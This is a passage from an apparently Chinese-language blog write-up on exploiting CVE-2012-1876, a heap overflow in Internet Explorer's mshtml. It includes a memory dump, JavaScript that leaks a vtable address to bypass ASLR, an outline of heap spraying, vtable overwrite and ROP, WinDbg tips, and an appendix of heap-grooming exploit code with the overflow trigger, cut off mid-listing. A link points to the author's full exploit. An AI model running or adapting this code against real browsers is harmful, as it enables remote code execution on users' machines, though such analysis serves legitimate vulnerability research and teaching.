00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b80  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b90  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525ba0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525bb0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525bc0  00420042 00420042 00420042 00000042  B.B.B.B.B.B.B...</span><br><span class="line">00525bd0  3ae939f1 8c000000 6b7c84f8 004dff88&lt;--vrftable  .9.:......|k..M.</span><br><span class="line">00525be0  04fefb30 6b7c8690 &lt;--vrftable 00000001 00000000  0.....|k........</span><br><span class="line">00525bf0  01080809 ffffffff 00000000 00000000  ................</span><br><span class="line">00525c00  00000000 ffffffff 00000080 ffffffff  ................</span><br></pre></td></tr></table></figure>

<p>还记得之前调试时候发现存在两个虚函数表，具体原因未知，不过只要分别计算偏移即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x mshtml!CButtonLayout::&#96;vftable&#39;可以动态查找虚函数表的地址</span><br></pre></td></tr></table></figure>
<p>使用如下代码将虚函数表地址提取出来，根据偏移地址001584f8计算出mshtml基地址为0x6b670000.</p>
<p>到这里，我们已经完成了地址泄漏，接下来只需要注意使用mshtml自身对gadgets，那么ASLR对我们也就形同虚设了。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/CVE-2012-1876/%E7%BB%95%E8%BF%87ASLR36808.png" alt="img"><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/CVE-2012-1876/%E7%BB%95%E8%BF%87ASLR36809.png" alt="img"> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;javascript&#39;&gt;  </span><br><span class="line">    Math.sin(2,1)</span><br><span class="line">    var evil_col &#x3D; document.getElementById(&quot;132&quot;);  </span><br><span class="line">    &#x2F;&#x2F;var evil_col &#x3D; document.getElementById(&quot;1&quot;); </span><br><span class="line">    evil_col.span &#x3D; &quot;19&quot;;</span><br><span class="line"></span><br><span class="line">    var leak_addr&#x3D;-1;</span><br><span class="line">for(var i &#x3D; 0;i&lt;500;i++)&#123;      </span><br><span class="line">&#x2F;&#x2F;提取虚函数表地址 </span><br><span class="line">        if(arr[i].length&gt;(0x100-6)&#x2F;2)&#123;</span><br><span class="line">            leak_index&#x3D;i;</span><br><span class="line">            var leak&#x3D;arr[i].substring((0x100-6)&#x2F;2+(2+8)&#x2F;2,(0x100-6)&#x2F;2+(2+8+4)&#x2F;2);</span><br><span class="line">            leak_addr &#x3D; parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),16);</span><br><span class="line">            alert(leak_addr.toString(16));</span><br><span class="line">            leak_addr&#x3D;leak_addr-Number(0x001584f8);</span><br><span class="line">            alert(leak_addr.toString(16));</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>Q:</strong><br><em><strong>肯定有读者有疑问，为什么要创建那么多table对象，而不只使用一个对象，然后溢出获得虚函数表。</strong></em></p>
<p><strong>A:</strong><br><em><strong>这个问题笔者也做了一个实验，在WIN7+IE8环境下，将<table>只保留第一个，让js对该对象进行修改，将这个exp精简得非常短小，居然也能有非常高的成功率。<br>应该是因为这是笔者的实验环境是IE8，而当时PWN2OWN的环境是IE9，其内存保护机制更为复杂，所以采用了较大数量的<table>保证成功率。</table></table></strong></em></p>
<p>PS:精简版的exploit可以在附录中找到。</p>
<h3 id="利用部分"><a href="#利用部分" class="headerlink" title="利用部分"></a>利用部分</h3><p>地址泄漏之后，通过覆盖虚函数表，需要结合HeapSpray和ROP等技术，大体内容与上一个案例相差无几。不再赘述了。</p>
<p>精确堆喷射-&gt;将rop和shellcode喷射到可控位置</p>
<p>覆盖虚函数表-&gt;将程序导入rop链中-&gt;stack povit将栈帧转移到堆中-&gt;ROP-&gt;PWN</p>
<p> 因为我国的网络安全法的试行条例，完整的Exploit就不放出了。不过这个<a target="_blank" rel="noopener" href="https://github.com/migraine-sudo/Arsenal/blob/master/CVE-2012-1876.html">Exploit</a>写出来稳定性还是非常高的，笔者也凭借该漏洞展示，混过了一次课堂作品展示。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/CVE-2012-1876/%E7%BB%95%E8%BF%87ASLR61827.png" alt="笔者的课堂演示"></p>
<h3 id="Windbg的几个小技巧-每次实践中记一些"><a href="#Windbg的几个小技巧-每次实践中记一些" class="headerlink" title="Windbg的几个小技巧[每次实践中记一些]"></a>Windbg的几个小技巧[每次实践中记一些]</h3><p> 对Jscript5引擎（Jscript.dll）的调试还是没什么经验，导致调试过程基本按照书本走。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bl显示所有断点</span><br><span class="line">bc清除断点</span><br><span class="line">bd 屏蔽断点be恢复断点</span><br><span class="line">bu xxx“.command; command” 断点后的操作，提高自动化程度</span><br><span class="line"></span><br><span class="line">gu运行到该函数退出 #类似gdb的finish</span><br><span class="line">p num运行num行</span><br><span class="line">.logopen开启日志</span><br><span class="line">.logclose关闭日志</span><br></pre></td></tr></table></figure>



<p>参考文献：</p>
<p>[1]《现代windows漏洞利用程序开发》,2016</p>
<p>[2] msf.[漏洞exploit工具-mona系列4] mona实战系列[DB&#x2F;OL].</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-198293.htm,2015-3-1">https://bbs.pediy.com/thread-198293.htm,2015-3-1</a></p>
<p>[3]<a target="_blank" rel="noopener" href="https://bbs.pediy.com/user-721335.htm">sakura零</a>.漏洞战争：CVE-2012-1876调试笔记[DB&#x2F;OL].</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-225252.htm,2018-3-18">https://bbs.pediy.com/thread-225252.htm,2018-3-18</a> </p>
<p>[4]xd0ol1.WinDbg 漏洞分析调试.<a target="_blank" rel="noopener" href="https://paper.seebug.org/182/[DB/OL],2017-01-12">https://paper.seebug.org/182/[DB/OL],2017-01-12</a></p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>调试用exploit.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;evil&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script language&#x3D;&#39;javascript&#39;&gt;</span><br><span class="line"> </span><br><span class="line">        var leak_index &#x3D; -1;</span><br><span class="line">        var dap &#x3D; &quot;EEEE&quot;;</span><br><span class="line">        while ( dap.length &lt; 480 ) dap +&#x3D; dap;</span><br><span class="line"> </span><br><span class="line">        var padding &#x3D; &quot;AAAA&quot;;</span><br><span class="line">        while ( padding.length &lt; 480 ) padding +&#x3D; padding;</span><br><span class="line"> </span><br><span class="line">        var filler &#x3D; &quot;BBBB&quot;;</span><br><span class="line">        while ( filler.length &lt; 480 ) filler +&#x3D; filler;</span><br><span class="line"> </span><br><span class="line">        var arr &#x3D; new Array();</span><br><span class="line">        var rra &#x3D; new Array();</span><br><span class="line"> </span><br><span class="line">        var div_container &#x3D; document.getElementById(&quot;evil&quot;);</span><br><span class="line">        div_container.style.cssText &#x3D; &quot;display:none&quot;;</span><br><span class="line">        &#x2F;&#x2F;1.布局堆块内存</span><br><span class="line">        for (var i&#x3D;0; i &lt; 500; i+&#x3D;2) &#123;</span><br><span class="line">            &#x2F;&#x2F; E</span><br><span class="line">            rra[i] &#x3D; dap.substring(0, (0x100-6)&#x2F;2);</span><br><span class="line">            &#x2F;&#x2F; S, bstr &#x3D; A</span><br><span class="line">            arr[i] &#x3D; padding.substring(0, (0x100-6)&#x2F;2);</span><br><span class="line">            &#x2F;&#x2F; A, bstr &#x3D; B</span><br><span class="line">            arr[i+1] &#x3D; filler.substring(0, (0x100-6)&#x2F;2);</span><br><span class="line">            &#x2F;&#x2F; B</span><br><span class="line">            var obj &#x3D; document.createElement(&quot;button&quot;);</span><br><span class="line">            div_container.appendChild(obj);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        for (var i&#x3D;200; i&lt;500; i+&#x3D;2 ) &#123;</span><br><span class="line">            rra[i] &#x3D; null;</span><br><span class="line">            CollectGarbage();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">Math.cos(3,2) </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;1&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;2&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;3&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;4&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;5&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;6&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;7&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;8&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;9&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;10&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;11&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;12&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;13&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;14&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;15&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;16&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;17&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;18&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;19&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;20&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;21&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;22&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;23&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;24&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;25&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;26&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;27&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;28&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;29&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;30&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;31&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;32&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;33&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;34&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;35&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;36&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;37&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;38&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;39&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;40&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;41&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;42&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;43&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;44&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;45&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;46&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;47&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;48&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;49&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;50&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;51&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;52&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;53&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;54&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;55&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;56&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;57&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;58&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;59&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; 